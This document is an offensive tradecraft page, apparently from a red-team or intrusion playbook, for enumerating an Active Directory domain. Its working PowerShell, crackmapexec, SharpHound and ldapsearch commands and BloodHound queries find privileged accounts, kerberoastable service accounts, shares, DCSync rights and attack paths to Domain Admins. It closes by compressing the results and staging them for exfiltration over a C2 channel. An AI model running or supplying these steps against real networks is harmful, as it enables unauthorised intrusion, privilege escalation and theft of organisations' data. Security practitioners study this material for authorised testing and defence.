# Active Directory enumeration for collection

Mapping the Active Directory environment to identify high-value targets,
privileged accounts, attack paths, and where sensitive data lives before
beginning lateral movement or bulk collection.

## Audit the environment before touching anything

```powershell
# check current identity and privileges
whoami /all
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
  Where-Object { $_.Value -match 'S-1-5-32-544|Domain Admins|Enterprise Admins' }

# identify domain and forest
(Get-ADDomain).DNSRoot
(Get-ADForest).Name
(Get-ADForest).Domains
```

## User and group enumeration

```powershell
# enumerate all enabled users with last logon
Get-ADUser -Filter { Enabled -eq $true } -Properties LastLogonDate, MemberOf |
  Select-Object SamAccountName, LastLogonDate,
    @{N='Groups'; E={$_.MemberOf -join '; '}} |
  Sort-Object LastLogonDate -Descending

# privileged groups: who is in them?
foreach ($group in @('Domain Admins','Enterprise Admins','Schema Admins',
                     'Backup Operators','Account Operators','Server Operators')) {
    $members = Get-ADGroupMember -Identity $group -Recursive 2>/dev/null |
               Select-Object -ExpandProperty SamAccountName
    Write-Output "$group : $($members -join ', ')"
}

# service accounts: often over-privileged, often have weak passwords
Get-ADUser -Filter { ServicePrincipalName -like '*' } -Properties ServicePrincipalName |
  Select-Object SamAccountName, ServicePrincipalName
```

## Computer enumeration

```powershell
# all domain computers with OS
Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
  Select-Object Name, OperatingSystem, LastLogonDate |
  Sort-Object LastLogonDate -Descending

# find servers specifically (useful for targeting file shares, databases)
Get-ADComputer -Filter { OperatingSystem -like '*Server*' } -Properties OperatingSystem |
  Select-Object Name, OperatingSystem
```

## Share enumeration

```powershell
# enumerate accessible shares across the domain
$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
foreach ($computer in $computers) {
    try {
        $shares = Get-WmiObject -Class Win32_Share -ComputerName $computer `
                    -ErrorAction Stop |
                  Where-Object { $_.Type -eq 0 }  # disk shares only
        foreach ($share in $shares) {
            Write-Output "$computer\$($share.Name): $($share.Path)"
        }
    } catch {}
}
```

```bash
# Linux: find shares using crackmapexec or smbclient
crackmapexec smb 192.168.1.0/24 --shares -u USER -p PASSWORD
```

## BloodHound collection

BloodHound provides attack path visualisation. SharpHound performs the
ingest; the output JSON files are imported into BloodHound.

```powershell
# SharpHound: collect all data (runs as current user)
.\SharpHound.exe -c All --outputdirectory C:\Temp\bh\

# stealthier: collect specific data only and use a lower collection frequency
.\SharpHound.exe -c DCOnly --stealth --outputdirectory C:\Temp\bh\
```

After import, key BloodHound queries:

```text
# Cypher: find shortest path to Domain Admins from owned principals
MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

# find users with DCSync rights
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(m:Domain)
RETURN n.name, m.name

# find kerberoastable users
MATCH (u:User {hasspn:true}) WHERE u.enabled=true
RETURN u.name, u.serviceprincipalnames
```

## Group Policy and trust enumeration

```powershell
# enumerate GPOs (may contain credential material or scripts)
Get-GPO -All | Select-Object DisplayName, GpoStatus, ModificationTime

# find GPO settings that deploy scripts
Get-GPO -All | ForEach-Object {
    $report = Get-GPOReport -Guid $_.Id -ReportType XML
    if ($report -match 'Script') { Write-Output $_.DisplayName }
}

# domain trusts: other domains that may be reachable
Get-ADTrust -Filter * | Select-Object Name, TrustType, TrustDirection, TrustAttributes
```

## LDAP queries (when PowerShell cmdlets are restricted)

```bash
# ldapsearch from Linux against a domain controller
ldapsearch -H ldap://DC_IP -b "DC=domain,DC=local" \
  -D "user@domain.local" -w "PASSWORD" \
  "(objectClass=user)" sAMAccountName userPrincipalName memberOf

# find accounts with passwords that do not expire
ldapsearch -H ldap://DC_IP -b "DC=domain,DC=local" \
  -D "user@domain.local" -w "PASSWORD" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
  sAMAccountName
```

## Output and staging

Collected enumeration data should be staged for exfiltration before leaving
the environment. Compress and optionally encrypt the output:

```powershell
Compress-Archive -Path C:\Temp\bh\*.json -DestinationPath C:\Temp\bh.zip
# exfiltrate bh.zip via C2 or exfiltration channel
```
